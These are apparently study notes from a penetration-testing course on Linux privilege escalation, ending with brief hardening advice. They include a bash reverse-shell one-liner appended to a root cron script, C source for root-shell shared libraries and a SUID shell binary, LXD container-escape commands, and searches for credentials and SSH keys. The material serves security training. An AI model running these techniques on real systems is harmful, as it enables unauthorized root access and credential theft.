
    
                //Enumeration


        --OS Version

        --Kernel Version

        --Running Services

    -List Current Processes

    $ ps aux | grep root


        --Installed Packages and Versions

        --Logged in Users

        --User Home Directories:

        User home folders may also contain SSH keys that can be used to access other systems or 
        scripts and configuration files containing credentials. (id_rsa)

        //Bash History

        $ history


        --Sudo Privileges

        --Configuration Files: all files that end in extensions such as .conf and .config

        --Readable Shadow File

        --Password Hashes in /etc/passwd

        --Cron Jobs :  

        $ ls -la /etc/cron.daily/


        --Unmounted File Systems and Additional Drives

        $ lsblk

        --SETUID and SETGID Permissions


        --Writeable Directories

        $ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null





                    ///Kernel exploits

        
        $ uname -a

        or

        $ cat /etc/lsb-release 


        $ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit



                    ///Vulnerable Services

        
        --Screen Version Identification

        $ screen -v

        $ ./screen_exploit.sh 




                    ////Cron Job Abuse

        
        The crontab command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in /var/spool/cron for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.

        The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.


        First, let's look around the system for any writeable files or directories.

        $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

        We can confirm that a cron job is running using pspy,

        $ ./pspy64 -pf -i 1000

        The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan profcs every 1000ms (or every second).

         Let's modify the script to add a Bash one-liner reverse shell.

         bash -i >& /dev/tcp/10.10.15.12/443 0>&1



                    ///Setuid Bit


        
        $ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null




                    ///Setguid

        $ find / -uid 0 -perm -6000 -type f 2>/dev/null



                    ///Sudo Rights Abuse


        $ sudo -l



                    ///Path Abuse


        PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.

        $ echo $PATH



                    ///Wildcard Abuse


        A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:
        Character 	                Significance
        * 	        An asterisk that can match any number of characters in a file name.
        ? 	        Matches a single character.
        [ ] 	    Brackets enclose characters and can match any single one at the defined position.
        
        ~ 	        A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
        
        - 	        A hyphen within brackets will denote a range of characters.




                    ///Searching for Creds


        When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files. 


        The /var directory typically contains the web root for whatever web server is running on the host.

        $ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

        The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

        $  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

        $  ls ~/.ssh




                    //Shared Libraries


        It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.


        There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.


        Additionally, the LD_PRELOAD environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.


        $ ldd /bin/ls


        //LD_PRELOAD Privilege Escalation


        Let's see an example of how we can utilize the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with sudo privileges.


        $ sudo -l

          (root) NOPASSWD: /usr/sbin/apache2 restart


        This user has rights to restart the Apache service as root, but since this is NOT a GTFOBin and the /etc/sudoers entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the LD_PRELOAD issue to run a custom shared library file. Let's compile the following library:

        (root.c)

        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
        }



        $ gcc -fPIC -shared -o root.so root.c -nostartfiles



        $ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

        Make sure to specify the full path to your malicious library file.




                    ///Shared Object Hijacking



        Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary.

        $ ls -la payroll

        -rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll


        We can use ldd to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.


        $ ldd payroll

        We see a non-standard library named libshared.so listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

        $ readelf -d payroll  | grep PATH


         0x000000000000001d (RUNPATH)            Library runpath: [/development]


         The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).\


         $ ls -la /development/

        total 8
        drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
        drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

        Before compiling a library, we need to find the function name called by the binary.

        $ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so


        $ ldd payroll

        linux-vdso.so.1 (0x00007ffd22bbc000)
        libshared.so => /development/libshared.so (0x00007f0c13112000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)


        $ ./payroll 

        ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery


        We can copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. We can compile a shared object which includes this function.



        #include<stdio.h>
        #include<stdlib.h>

        void dbquery() {
            printf("Malicious library loaded\n");
            setuid(0);
            system("/bin/sh -p");
        } 



        The dbquery function sets our user id to 0 (root) and executing /bin/sh when called. Compile it using GCC.


        $ gcc src.c -fPIC -shared -o /development/libshared.so




                  ///Privileged Groups


        /LXC / LXD



        LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.


        $ id

        uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

        Unzip the Alpine image.

        $ unzip alpine.zip 

        Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.(https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)

        $ lxd init

        Import the local image.

        $ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine


        Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

        $ lxc init alpine r00t -c security.privileged=true

        Mount the host file system.

        $ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

        Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.


        $ lxc start r00t
        $ lxc exec r00t /bin/sh



            //Docker

        Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.


            //Disk

        Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.


            //ADM

        Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.



                    ///Passive Traffic Capture
        


        If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as net-creds and PCredz that can be used to examine data being passed on the wire.



                    //Weak NFS Privileges

        $ showmount -e 10.129.2.12

        When an NFS volume is created, various options can be set:

        Option 	Description
  root_squash 	If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.
  
  no_root_squash 	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.


  For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.


        $ cat shell.c 



        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        int main(void)
        {
          setuid(0); setgid(0); system("/bin/bash");
        }


      $ gcc shell.c -o shell

      $ sudo mount -t nfs 10.129.2.12:/tmp /mnt
      $ cp shell /mnt
      $ chmod u+s /mnt/shell


      When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.




              ///Hijacking Tmux Sessions


      Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a tmux window, we can detach from the session, still leaving it active (i.e., running an nmap scan). For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.



      $ tmux -S /shareds new -s debugsess

      $ chown root:devs /shareds


      Check for any running tmux processes.

      $  ps aux | grep tmux

      Confirm permissions.

      $ ls -la /shareds 

      srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds


      Finally, attach to the tmux session and confirm root privileges.

      $ tmux -S /shareds





                ///Linux Hardening

      --Configuration Management

      This is by no means an exhaustive list, but some simple hardening measures are to:

    Audit writable files and directories and any binaries set with the SUID bit.
    Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.
    Do not store credentials in cleartext in world-readable files.
    Clean up home directories and bash history.
    Ensure that low-privileged users cannot modify any custom libraries called by programs.
    Remove any unnecessary packages and services that potentially increase the attack surface.
    Consider implementing SELinux, which provides additional access controls on the system.


    


